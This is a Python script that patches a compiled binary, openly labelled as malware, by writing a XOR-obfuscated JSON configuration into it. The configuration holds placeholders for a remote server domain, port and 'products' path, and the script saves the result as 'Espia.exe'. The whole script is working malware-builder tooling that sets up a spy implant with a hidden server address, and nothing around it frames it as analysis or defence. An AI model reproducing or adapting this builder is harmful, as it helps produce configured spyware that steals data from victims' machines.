import json
import shutil
from pathlib import Path

_MALWARE_CONFIG_BUFFER = 1000
_COMPILED_MALWARE_PATH = "<Malware original binary path>"
_PATCHED_FILES_DIR = Path('../static_files')
_BEGIN_OF_CONFIG_SUFFIX = '{"Domain":'
_PATCHED_FILE_NAME = f'Espia.exe'
_XOR_KEY = "Q"
_CONFIG = {
    "Domain": "<Server hostname\domain for products>",
    "Port": "<Server Port>",
    "ProductsPath": "<Remote products directory>"
}


def xor(data):
    return bytearray(data[i] ^ ord(_XOR_KEY) for i in range(0, len(data)))


exe_file = Path(_COMPILED_MALWARE_PATH)
patched_file_path = _PATCHED_FILES_DIR / _PATCHED_FILE_NAME

# Create generated exe files
_PATCHED_FILES_DIR.mkdir(exist_ok=True, parents=True)

json_config = json.dumps(_CONFIG).encode()
padding = b"\x00" * (_MALWARE_CONFIG_BUFFER - len(json_config))

json_config = xor(json_config) + padding

# Search for start of config in binary
with open(exe_file, 'rb') as bin_file:
    byte_data = bytearray(bin_file.read())
offset = byte_data.find(_BEGIN_OF_CONFIG_SUFFIX.encode())

# Create copy of exe file
shutil.copy(exe_file, patched_file_path)

with open(patched_file_path, 'r+b') as bin_file:
    bin_file.seek(offset)
    bin_file.write(json_config)

print(f"Finished patching file: {_PATCHED_FILES_DIR.name} / {_PATCHED_FILE_NAME}, offset: {offset}")
